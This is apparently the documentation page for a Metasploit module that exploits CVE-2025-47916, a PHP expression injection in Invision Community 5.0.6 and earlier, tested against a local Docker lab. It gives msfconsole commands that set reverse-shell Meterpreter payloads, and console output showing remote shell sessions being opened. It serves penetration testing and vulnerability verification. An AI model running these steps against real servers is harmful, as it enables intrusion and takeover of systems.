## Vulnerable Application

This Metasploit module exploits a remote-code injection in Invision Community ≤ 5.0.6 via the **theme editor**’s `customCss` endpoint:

* **CVE-2025-47916**: malformed `{expression="…"}` allows evaluation of arbitrary PHP expressions in the `content` parameter.

### To replicate a vulnerable environment

1. **Download the pre-built Docker lab** (includes `Dockerfile`, `docker-compose.yml` and the IPS 5.0.6 application):

```bash
wget https://archive.org/download/ips-5.0.6/IPS-5.0.6.zip -O ips_5.0.6_lab.zip
mkdir ips_5.0.6_lab_dir
unzip ips_5.0.6_lab.zip -d ips_5.0.6_lab_dir
cd ips_5.0.6_lab_dir
```

2. **Bring up the stack**:

```bash
docker-compose up -d
```

3. **Complete the installer** by browsing to [http://localhost:7777](http://localhost:7777).

   * You do **not** need a valid license key; you can enter any text and proceed.
   * Use database host `db`, user `ipsuser`, password `ipspass`, database `ipsdb`.

## Verification Steps

1. **Check the installed version**:

```bash
curl -s http://localhost:7777/admin/install/eula.txt | head -n5
```

Expected output:

```
=============================[NOTE]=============================
 Buy license at https://invisioncommunity.com/buy/self-hosted/
================================================================
 IPS 5.0.6 (5000074)
=============================[NOTE]=============================
```

2. **In `msfconsole`**, confirm the module’s `check` returns vulnerable:

```bash
use exploit/multi/http/invision_customcss_rce
set RHOSTS 127.0.0.1
set TARGETURI /
check
```

## Options

No option

## Scenarios

### PHP Meterpreter (in-memory)

```bash
use exploit/multi/http/invision_customcss_rce
set TARGET 0
set RHOSTS 127.0.0.1
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

### Command Shell (ARCH_CMD)

```bash
use exploit/multi/http/invision_customcss_rce
set TARGET 1
set RHOSTS 127.0.0.1
set TARGETURI /
set payload cmd/linux/http/x64/meterpreter_reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

## Expected Results

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/invision_customcss_rce) > run http://localhost:7777
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected IPS version: 5.0.6
[+] The target is vulnerable. IPS version 5.0.6 is vulnerable (≤ 5.0.6)
[*] Sending exploit to 127.0.0.1:7777 ...
[*] Sending stage (40004 bytes) to 172.30.0.3
[*] Meterpreter session 9 opened (192.168.1.36:4444 -> 172.30.0.3:34414) at 2025-05-20 18:13:55 +0200
[*] Session 9 created in the background.
msf6 exploit(multi/http/invision_customcss_rce) > sessions 9
[*] Starting interaction with 9...

meterpreter > sysinfo
Computer    : 01ed59644450
OS          : Linux 01ed59644450 6.14.6-2-cachyos #1 SMP PREEMPT_DYNAMIC Sat, 10 May 2025 20:09:10 +0000 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter_reverse_tcp`:

```plaintext
msf6 exploit(multi/http/invision_customcss_rce) > run http://localhost:7777
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 192.168.1.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected IPS version: 5.0.6
[+] The target is vulnerable. IPS version 5.0.6 is vulnerable (≤ 5.0.6)
[*] Sending exploit to 127.0.0.1:7777 ...
[*] Meterpreter session 7 opened (192.168.1.36:4444 -> 172.30.0.3:46552) at 2025-05-20 18:11:35 +0200
[*] Session 7 created in the background.
msf6 exploit(multi/http/invision_customcss_rce) > sessions 7
[*] Starting interaction with 7...

meterpreter > sysinfo
Computer     : 172.30.0.3
OS           : Debian 12.10 (Linux 6.14.6-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
